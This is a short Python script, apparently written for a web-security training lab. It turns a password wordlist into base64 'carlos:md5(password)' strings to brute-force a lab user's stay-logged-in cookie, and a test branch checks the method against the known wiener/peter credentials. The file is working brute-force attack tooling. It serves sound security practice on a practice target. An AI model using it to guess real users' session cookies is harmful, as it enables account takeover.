# encoding: utf-8

# read all the passwords from the wordlist and write another list with the cookie values
# formatted as base64(username+':'+md5HashOfPassword)
import hashlib
from base64 import b64encode

# set the test as wiener's password that is: peter
test = ""

if len(test) == 0:
    fn = open('cookieB64.txt', 'w') # file with the cookie to brute force carlos user
    f = open("D:/wordlists/burp_auth_pwd.txt", 'r')
    lines = f.readlines()
    for l in lines:
        # md5 hash of the current pwd
        pwdmd5 = hashlib.md5(l.strip().encode()).hexdigest()
        #create the encoded b64 cookie
        cookie = b64encode(b"carlos:" + pwdmd5.encode('ascii'))
        #write the value to the cookie list file 
        fn.writelines(cookie.decode('ascii')+'\n')
    fn.close()

else: #test case
    # peter MD5 value should be 51dc30ddc473d43a6011e9ebba6ca770
    # the whole cookie should be d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
    pwdmd5 = hashlib.md5(test.encode()).hexdigest()
    cookie = b64encode(b"wiener:" + pwdmd5.encode('ascii'))
    print(cookie.decode('ascii'))